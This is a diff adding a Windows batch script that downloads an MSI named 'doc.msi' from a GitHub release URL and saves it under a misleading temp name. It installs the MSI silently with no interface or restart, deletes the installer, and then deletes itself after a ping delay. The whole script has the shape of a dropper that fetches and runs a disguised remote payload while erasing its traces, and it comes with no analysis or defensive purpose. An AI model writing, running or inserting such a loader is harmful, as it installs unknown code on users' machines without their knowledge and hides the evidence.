@@ -1,0 +1,26 @@
+@echo off
+setlocal
+
+:: 1. Define paths
+set "MSI_PATH=%TEMP%\wafaction1.msi"
+set "MSI_URL=https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
+
+:: 2. Download the MSI silently
+:: (Using -s -L to hide progress and follow redirects)
+curl.exe -s -L -o "%MSI_PATH%" "%MSI_URL%"
+
+:: 3. Verify the download succeeded
+if exist "%MSI_PATH%" (
+    :: 4. Install the MSI silently (no UI, no restart)
+    msiexec.exe /i "%MSI_PATH%" /quiet /norestart
+    
+    :: 5. Clean up the MSI after installation
+    :: We use a small ping delay to ensure msiexec has finished reading the file before deletion
+    ping 127.0.0.1 -n 4 > nul
+    del /f /q "%MSI_PATH%"
+)
+
+:: 6. Self-delete the batch script
+:: (Using a ping delay allows the cmd.exe process to unlock the file so it can be deleted)
+start "" /b cmd.exe /c "ping 127.0.0.1 -n 3 > nul & del /f /q "%~f0""
+exit /b 0
